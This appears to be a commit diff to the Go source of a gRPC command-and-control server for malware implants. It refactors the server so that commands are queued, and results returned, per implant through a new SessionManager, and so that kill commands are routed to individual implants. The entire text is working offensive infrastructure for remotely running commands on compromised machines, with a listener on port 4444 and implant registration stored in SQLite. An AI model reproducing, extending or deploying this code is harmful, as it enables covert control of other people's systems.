@@ -29,33 +29,36 @@ const banner = `
 ------------ C2 Server ------------
 `
 
+type SessionManager struct {
+	work    map[string]chan *grpcapi.Command
+	results map[string]chan *grpcapi.Command
+}
+
 type implantServer struct {
 	grpcapi.UnimplementedImplantServer
-	work, output chan *grpcapi.Command
-	implants     map[uuid.UUID]time.Time
-	db           *sql.DB
+	sessions *SessionManager
+	implants map[uuid.UUID]time.Time
+	db       *sql.DB
 }
 
 type adminServer struct {
 	grpcapi.UnimplementedAdminServer
-	work, output chan *grpcapi.Command
-	implants     map[uuid.UUID]time.Time
-	db           *sql.DB
+	sessions *SessionManager
+	implants map[uuid.UUID]time.Time
+	db       *sql.DB
 }
 
-func NewImplantServer(work, output chan *grpcapi.Command, implants map[uuid.UUID]time.Time, db *sql.DB) *implantServer {
+func NewImplantServer(sessions *SessionManager, implants map[uuid.UUID]time.Time, db *sql.DB) *implantServer {
 	s := new(implantServer)
-	s.work = work
-	s.output = output
+	s.sessions = sessions
 	s.implants = implants
 	s.db = db
 	return s
 }
 
-func NewAdminServer(work, output chan *grpcapi.Command, implants map[uuid.UUID]time.Time, db *sql.DB) *adminServer {
+func NewAdminServer(sessions *SessionManager, implants map[uuid.UUID]time.Time, db *sql.DB) *adminServer {
 	s := new(adminServer)
-	s.work = work
-	s.output = output
+	s.sessions = sessions
 	s.implants = implants
 	s.db = db
 	return s
@@ -72,7 +75,7 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 
 	var cmd = new(grpcapi.Command)
 	select {
-	case cmd, ok := <-s.work:
+	case cmd, ok := <-s.sessions.work[id]:
 		if ok {
 			return cmd, nil
 		}
@@ -84,7 +87,14 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 }
 
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
-	s.output <- result
+	md, ok := metadata.FromIncomingContext(ctx)
+	if !ok {
+		return nil, status.Error(codes.Unauthenticated, "no metadata provided")
+	}
+
+	id := md["implant-id"][0]
+
+	s.sessions.results[id] <- result
 	return &grpcapi.Empty{}, nil
 }
 
@@ -96,6 +106,8 @@ func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *grpcapi.E
 		return nil, err
 	}
 	s.implants[implantId] = time.Now()
+	s.sessions.work[implantId.String()] = make(chan *grpcapi.Command)
+	s.sessions.results[implantId.String()] = make(chan *grpcapi.Command)
 
 	insertImplant(s.db, implantId, ipAddress, time.Now(), time.Now())
 
@@ -108,9 +120,9 @@ func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *grpcapi.E
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
 	var res *grpcapi.Command
 	go func() {
-		s.work <- cmd
+		s.sessions.work[cmd.ImplantId] <- cmd
 	}()
-	res = <-s.output
+	res = <-s.sessions.results[cmd.ImplantId]
 	return res, nil
 }
 
@@ -148,7 +160,7 @@ func (s *adminServer) DeleteImplant(ctx context.Context, deleteRequest *grpcapi.
 		IsKill: true,
 	}
 
-	s.work <- killCmd
+	s.sessions.work[deleteRequest.Id] <- killCmd
 
 	err := deleteImplant(s.db, deleteRequest.Id)
 	if err != nil {
@@ -163,7 +175,6 @@ func main() {
 		implantListener, adminListener net.Listener
 		err                            error
 		opts                           []grpc.ServerOption
-		work, output                   chan *grpcapi.Command
 	)
 
 	db, err := sql.Open("sqlite3", "server.db?_loc=auto&parseTime=true")
@@ -188,10 +199,13 @@ func main() {
 	}
 	clientOpts := append(opts, grpc.Creds(clientCreds))
 
-	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+	sessions := &SessionManager{
+		work:    make(map[string]chan *grpcapi.Command),
+		results: make(map[string]chan *grpcapi.Command),
+	}
 	implants := make(map[uuid.UUID]time.Time)
-	implant := NewImplantServer(work, output, implants, db)
-	admin := NewAdminServer(work, output, implants, db)
+	implant := NewImplantServer(sessions, implants, db)
+	admin := NewAdminServer(sessions, implants, db)
 
 	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
 		log.Fatal(err)
